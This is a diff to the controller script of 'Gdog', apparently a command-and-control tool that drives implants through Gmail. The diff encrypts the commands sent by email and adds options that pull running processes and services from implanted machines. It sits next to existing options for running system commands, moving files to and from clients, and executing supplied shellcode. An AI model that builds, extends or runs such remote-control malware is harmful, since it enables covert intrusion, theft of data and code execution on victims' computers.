@@ -134,7 +134,7 @@ class Gdog:
         msg['To'] = gmail_user
         msg['Subject'] = sub_header
         msgtext = json.dumps({'cmd': cmd, 'arg': arg})
-        msg.attach(MIMEText(str(msgtext)))
+        msg.attach(MIMEText(str(infoSec.Encrypt(msgtext))))
         
         for attach in attachment:
             if os.path.exists(attach) == True:  
@@ -226,7 +226,8 @@ class Gdog:
             print "FG WINDOWS: '{}'".format(msg.dict['fgwindow'])
             print "CMD: '{}'".format(msg.dict['msg']['cmd'])
             print ''
-            print msg.dict['msg']['res'] + '\n'
+            print "'{}'\n".format(msg.dict['msg']['res'])
+            #print msg.dict['msg']['res'] + '\n'
 
             if msg.attachment:
 
@@ -275,6 +276,8 @@ if __name__ == '__main__':
     sgroup = parser.add_argument_group("Commands", "Commands to execute on an implant")
     slogopts = sgroup.add_mutually_exclusive_group()
     slogopts.add_argument("-cmd", metavar='CMD', dest='cmd', type=str, help='Execute a system command')
+    slogopts.add_argument("-tasks", dest='tasks', action='store_true', help='Retrieve running processes')
+    slogopts.add_argument("-services", dest='services', action='store_true', help='Retrieve system services')
     slogopts.add_argument("-download", metavar='PATH', dest='download', type=str, help='Download a file from a clients system')
     slogopts.add_argument("-upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the clients system")
     slogopts.add_argument("-exec-shellcode", metavar='FILE',type=argparse.FileType('rb'), dest='shellcode', help='Execute supplied shellcode on a client')
@@ -302,6 +305,12 @@ if __name__ == '__main__':
     elif args.cmd:
         gdog.sendEmail(args.id, jobid, 'cmd', args.cmd)
 
+    elif args.tasks:
+        gdog.sendEmail(args.id, jobid, 'tasks')
+    
+    elif args.services:
+        gdog.sendEmail(args.id, jobid, 'services')
+        
     elif args.shellcode:
         gdog.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip())
 
